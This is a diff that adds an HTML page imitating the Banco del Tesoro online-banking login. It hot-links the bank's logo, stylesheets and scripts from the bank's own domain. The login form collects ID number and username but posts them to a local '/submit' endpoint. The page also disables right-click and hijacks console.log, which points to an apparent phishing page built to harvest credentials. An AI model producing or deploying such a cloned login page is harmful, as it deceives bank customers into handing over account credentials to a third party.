@@ -1,0 +1,380 @@
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco del Tesoro</title>
+
+    <!--Bootstrap icons-->
+    <link href="https://btenlinea.bt.com.ve/assets/fonts/bootstrap-icons/bootstrap-icons.css?1089973" rel="stylesheet">
+
+    <link rel="stylesheet" href="https://btenlinea.bt.com.ve/assets/css/style.min.css?2196619" id="switchThemeStyle">
+
+    <link rel="stylesheet" href="https://btenlinea.bt.com.ve/css/notifications/sweetalert2/sweetalert2.bundle.css">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://btenlinea.bt.com.ve/img/favicon/favicon-32x32.png">
+
+    <style>
+        
+            @media (min-width: 1200px) {
+
+                body {
+                    background: url(https://btenlinea.bt.com.ve/img/bg/navidad/bgLogin.png) no-repeat center bottom fixed;
+                    -webkit-background-size: cover;
+                    -moz-background-size: cover;
+                    -o-background-size: cover;
+                    background-size: cover;
+                }
+
+                #card {
+                    transition: 0.7s ease;
+                    margin-left: 70% !important;
+                }
+
+                .btn {
+                    text-transform: none !important;
+                }
+
+                .text-tesoro-blue {
+                    color: rgb(0, 45, 115);
+                }
+
+                #yearbdt{
+                    margin-right: 5%;
+                }
+
+            }
+
+            @media (min-width: 300px) and (max-width: 1199px) {
+
+                #card {
+                    margin-left: 15% !important;
+                    background-position: top right !important;
+                    width: 75%;
+                }
+
+                label, p {
+                    font-weight: bold;
+                }
+
+                body {
+                    background: linear-gradient(rgba(0, 0, 0, 0), rgba(255, 255, 0, 0), rgba(0, 255, 0, 0)),  url(https://btenlinea.bt.com.ve/img/bg/nuevas/movil/btenlinea_movil.jpg) no-repeat center bottom;
+                    background-attachment: fixed;
+                }
+
+                #yearbdt{
+                    margin-right: 20%;
+                }
+            }
+
+            /*SWEETALERT2*/
+            .swal2-styled.swal2-confirm {
+                background-color: #002D73 !important;
+            }
+
+            .swal2-styled.swal2-cancel, .swal2-styled.swal2-deny {
+                background-color: #ff0000 !important;;
+            }
+
+            .hide {
+                display: none !important;
+            }
+
+            .avatar-group .avatar-group-item {
+                border: none !important;
+            }
+
+
+            </style>
+
+</head>
+
+<body style="height: 100% !important;">
+
+<div
+    class="d-flex flex-column flex-root bgi-position-y-bottom position-x-center bgi-no-repeat bgi-size-contain bgi-attachment-fixed"
+    style="">
+    <!--Page-->
+    <div class="page d-flex flex-row flex-column-fluid">
+
+        <!--///////////Page content wrapper///////////////-->
+        <main class="page-content overflow-hidden ms-0 d-flex flex-column flex-row-fluid">
+
+            <!--//content//-->
+            <div class="content p-1 d-flex flex-column-fluid position-relative">
+                <div class="container py-4">
+                    <div class="row pt-10">
+                        <div class="offset-md-8 col-md-6 col-lg-5 col-xl-4 col-sm-8 col- pt-5" id="card">
+                            <!--Logo-->
+                            <div class="d-flex position-relative mb-4 z-index-1 align-items-center justify-content-center">
+            <img src="https://btenlinea.bt.com.ve/img/logo-slogan.png" alt="Banco del Tesoro"
+             srcset="https://btenlinea.bt.com.ve/img/logo-slogan.png" 0="class" class="w-100" style="max-width: 500px;"
+             loading="lazy">
+        </div>
+                            <!--Card-->
+                            <div class="p-4">
+                                <h4 class="text-">¡Bienvenido (a)!</h4>
+                                <p class="text-">Para iniciar sesión en tu cuenta, por favor introduce tus datos.</p>
+
+                                <!-- Session Status -->
+                                
+                                <!-- Validation Errors -->
+                                                                                                
+                                <form method="POST" action="/submit" id="form" autocomplete="off"
+              class="z-index-1 position-relative" novalidate="">
+            <input type="hidden" name="_token" value="ZsrCBHGQWKoIdORBKi9IBpPmmgmo13t5qpD4iV9J">            <div class="mb-3">
+                <label
+    class="form-label  "
+    for="tipodocben">Número de documento</label>
+<div class="input-group">
+    <select style="margin-right: 0px; border-radius: 10px 0px 0px 10px; width: 20% !important;"
+            class="form-select "
+            name="tipodocben" id="tipodocben" required>
+                    <option  value="01">V</option>
+            
+            <option  value="04">J</option>
+            <option  value="08">E</option>
+            <option  value="10">G</option>
+            <option  value="11">C</option>
+            <option  value="05">R</option>
+            </select>
+    <input style="margin-left: 0px; width: 65% !important;" placeholder="Documento"
+           class="form-control " maxlength="9"
+           minlength="5" data-inputmask="'mask': '999999999', 'placeholder':''" value=""
+           name="documento" id="documento" required>
+</div>
+            </div>
+
+            <div class="mb-3">
+                <div>
+            <label class="form-label "
+               for="username">Usuario</label>
+        <input class="form-control" name="username" id="username" value="" type="text" autocomplete="off" placeholder="Nombre de usuario" required="required"
+         maxlength=16 
+        
+        
+    />
+
+</div>
+            </div>
+
+            <div class="d-flex align-items-center justify-content-center hide p-4 cargando"
+     role="status" >
+    <svg class="anim-spinner text-tesoro-blue me-3" width="24" height="24" viewBox="0 0 24 24" fill="none"
+         xmlns="http://www.w3.org/2000/svg">
+        <path
+            d="M24 12C24 14.3734 23.2962 16.6935 21.9776 18.6668C20.6591 20.6402 18.7849 22.1783 16.5922 23.0866C14.3995 23.9948 11.9867 24.2324 9.65892 23.7694C7.33114 23.3064 5.19295 22.1635 3.51472 20.4853C1.83649 18.8071 0.693599 16.6689 0.230577 14.3411C-0.232446 12.0133 0.00519403 9.60051 0.913446 7.4078C1.8217 5.21509 3.35977 3.34094 5.33316 2.02236C7.30655 0.703788 9.62662 -2.83022e-08 12 0L12 3C10.22 3 8.47991 3.52784 6.99987 4.51677C5.51983 5.50571 4.36627 6.91131 3.68508 8.55585C3.0039 10.2004 2.82567 12.01 3.17293 13.7558C3.5202 15.5016 4.37737 17.1053 5.63604 18.364C6.89471 19.6226 8.49836 20.4798 10.2442 20.8271C11.99 21.1743 13.7996 20.9961 15.4442 20.3149C17.0887 19.6337 18.4943 18.4802 19.4832 17.0001C20.4722 15.5201 21 13.78 21 12H24Z"
+            fill="currentColor"></path>
+    </svg>
+    <span class="">Cargando, por favor espera...</span>
+</div>
+            <div class="botones">
+                <button class="w-100 btn" style="background-color: #1511A0; color: white"
+                        type="submit">Ingresar</button>
+
+                <div class="row">
+                    <div class="col-md-6 mt-3">
+                        <a class="w-100 btn" style="background-color: #EF3641; color: white"
+                           href="https://btenlinea.bt.com.ve/rg/n/1">Registro</a>
+                    </div>
+                    <div class="col-md-6 mt-3">
+                        <a class="w-100 btn" style="background-color: #EF3641; color: white"
+                           href="https://btenlinea.bt.com.ve/du/1">Desbloqueo</a>
+                    </div>
+                </div>
+                <div class="row mt-4">
+                    <div class="col-md-12 text-center">
+                        <a class="w-100 text-decoration-underline" style="font-weight: bold;"
+                           href="https://btenlinea.bt.com.ve/oum/1">¿Olvidaste tu usuario?</a>
+                    </div>
+                </div>
+            </div>
+            <div class="avatar-group d-flex justify-content-center mt-3">
+                <a class="avatar-group-item avatar sm rounded-circle" data-bs-toggle="tooltip" title=""
+                   data-bs-original-title="Google Chrome">
+                    <img src="https://btenlinea.bt.com.ve/img/navegadores/chrome.png" alt="chrome"
+                         class="avatar-group-img rounded-circle">
+                </a>
+                <a class="avatar-group-item avatar sm rounded-circle" data-bs-toggle="tooltip" title=""
+                   data-bs-original-title="Microsoft Edge">
+                    <img src="https://btenlinea.bt.com.ve/img/navegadores/edge.png" alt="edge"
+                         class="avatar-group-img rounded-circle">
+                </a>
+                <a class="avatar-group-item avatar sm rounded-circle" data-bs-toggle="tooltip" title=""
+                   data-bs-original-title="Mozilla Firefox">
+                    <img src="https://btenlinea.bt.com.ve/img/navegadores/firefox.png" alt="firefox"
+                         class="avatar-group-img rounded-circle">
+                </a>
+                <a class="avatar-group-item avatar sm rounded-circle" data-bs-toggle="tooltip" title=""
+                   data-bs-original-title="Safari">
+                    <img src="https://btenlinea.bt.com.ve/img/navegadores/safari.png" alt="safari"
+                         class="avatar-group-img rounded-circle">
+                </a>
+            </div>
+            <p class="text-center mt-1">Para una mejor experiencia, usa alguno de estos navegadores en su versión más
+                reciente</p>
+        </form>
+
+                            </div>
+
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!--///////////Page content wrapper end///////////////-->
+
+            <!--//Page-footer//-->
+            <footer class="pb-4 px-4 px-lg-8">
+                <div class="container-fluid px-0">
+                    <span class="d-block lh-sm small text-muted text-end" id="yearbdt">
+                        &copy; 2024. BDT
+                    </span>
+                </div>
+            </footer>
+            <!--/.Page Footer End-->
+        </main>
+    </div>
+</div>
+
+<!--////////////Theme Core scripts Start/////////////////-->
+
+<script src="https://btenlinea.bt.com.ve/assets/vendor/inputmask.min.js"></script>
+<script src="/assets/vendor/feather.min.js"></script>
+<script src="/assets/js/theme.bundle.js"></script>
+<script src="/js/functions.js"></script>
+<script src="https://btenlinea.bt.com.ve/js/formplugins/jquery-validate/jquery.validate.min.js"></script>
+<script src="https://btenlinea.bt.com.ve/js/formplugins/jquery-form/jquery-form.min.js"></script>
+<script>
+    jQuery.extend(jQuery.validator.messages, {
+        required: "Este campo es requerido.",
+        remote: "Por favor, arregle este campo.",
+        email: "Introduzca una dirección de correo válida",
+        url: "Introduzca una URL válida",
+        date: "Introduzca una fecha válida",
+        dateISO: "Please enter a valid date (ISO).",
+        number: "Introduzca sólo números",
+        digits: "Introduzca sólo digitos",
+        creditcard: "Please enter a valid credit card number.",
+        equalTo: "Please enter the same value again.",
+        accept: "Please enter a value with a valid extension.",
+        maxlength: jQuery.validator.format("No introduzca más de {0} caracteres"),
+        minlength: jQuery.validator.format("Introduzca al menos {0} caracteres"),
+        rangelength: jQuery.validator.format("Introduzca una valor entre {0} y {1} caracteres"),
+        range: jQuery.validator.format("Please enter a value between {0} and {1}."),
+        max: jQuery.validator.format("Introduzca un valor no mayor a {0}."),
+        min: jQuery.validator.format("Introduzca un valor mayor o igual a {0}.")
+    });
+</script>
+<script>
+        $(document).bind("contextmenu", function (e) {
+        return false;
+    });
+
+    console.log = function () {
+        return 'Si llegaste hasta aqui, estas siendo monitoreado.';
+    }
+    
+    feather.replace()
+</script>
+
+<!--////////////Theme Core scripts End/////////////////-->
+
+<script src="assets/vendor/inputmask.min.js"></script>
+        <script type="text/javascript">
+
+            var timer;
+
+            Inputmask().mask(document.querySelectorAll("[data-inputmask]"));
+
+            function Timer(fn, t) {
+                var timerObj = setInterval(fn, t);
+
+                this.stop = function () {
+                    if (timerObj) {
+                        clearInterval(timerObj);
+                        timerObj = null;
+                    }
+                    return this;
+                }
+
+                // start timer using current settings (if it's not already running)
+                this.start = function () {
+                    if (!timerObj) {
+                        this.stop();
+                        timerObj = setInterval(fn, t);
+                    }
+                    return this;
+                }
+
+                // start with new interval, stop current interval
+                this.reset = function (newT) {
+                    t = newT;
+                    return this.stop().start();
+                }
+            }
+
+
+            pagefunction = function () {
+                $("#username").on("keypress", function (e) {
+                    if (e.which === 13)
+                        $('#form').submit()
+                    var letterNumber = /^[0-9a-zA-Z]+$/;
+                    var str = String.fromCharCode(!e.charCode ? e.which : e.charCode);
+                    if (!str.match(letterNumber))
+                        return false;
+                })
+
+                $("#documento").focus();
+
+                timer = new Timer(function () {
+                    Swal.fire({
+                        icon: 'info',
+                        text: 'No hemos visto actividad, por medidas de seguridad deberá realizar el ingreso desde el inicio',
+                        allowOutsideClick: false,
+                        allowEscapeKey: false,
+                        allowEnterKey: false
+                    }).then(function () {
+                        window.location.reload();
+                    });
+                }, 60 * 5 * 1000);
+
+                $(document).on('click', function () {
+                    timer.reset(60 * 5 * 1000);
+                });
+
+                $("#form").validate({
+                    rules: {
+                        documento: {
+                            required: true,
+                            minlength: 5,
+                            maxlength: 16
+                        },
+                        username: {
+                            required: true,
+                            minlength: 8,
+                            maxlength: 16
+                        }
+                    },
+                    messages: {},
+                    submitHandler: function (form) {
+                        $("#cmdNext").prop("disabled", "disabled")
+                        $(".cargando").removeClass('hide');
+                        $(".botones").addClass('hide');
+                        form.submit();
+                    },
+                    errorPlacement: function (error, element) {
+                        error.addClass('text-danger');
+                        error.insertAfter(element.parent());
+                    },
+                    highlight: function (element, errorClass, validClass) {
+                        $(element).addClass('is-invalid');
+                    },
+                    unhighlight: function (element, errorClass, validClass) {
+                        $(element).removeClass('is-invalid');
+                    }
+                });
+            };
+            pagefunction();
+        </script>
+
+</body>
+
+</html>
